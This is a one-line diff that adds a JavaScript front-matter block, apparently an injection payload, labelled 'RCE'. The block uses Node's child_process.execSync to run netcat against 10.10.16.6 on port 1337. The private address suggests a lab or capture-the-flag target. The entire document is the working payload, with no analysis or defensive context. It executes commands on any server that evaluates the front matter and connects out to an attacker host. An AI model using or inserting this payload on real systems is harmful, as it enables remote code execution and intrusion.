@@ -1,0 +1,1 @@
+---js\n((require("child_process")).execSync("nc 10.10.16.6 1337"))\n---RCE
